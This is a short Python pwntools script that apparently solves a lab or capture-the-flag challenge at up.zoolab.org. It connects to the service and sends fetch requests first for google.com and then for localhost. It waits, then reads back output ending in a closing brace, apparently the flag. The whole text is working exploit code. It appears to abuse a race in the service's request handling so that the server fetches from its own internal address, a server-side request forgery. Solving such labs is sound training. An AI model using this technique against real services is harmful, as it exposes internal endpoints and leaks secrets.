from pwn import *
import time

r = remote('up.zoolab.org',10932)
r.sendline("g".encode())
r.sendline("google.com/10000".encode())

r.sendline("g".encode())
r.sendline("localhost/10000".encode())

time.sleep(150)
r.sendline("v".encode())
msg = r.recvuntil(b'}')
print(msg)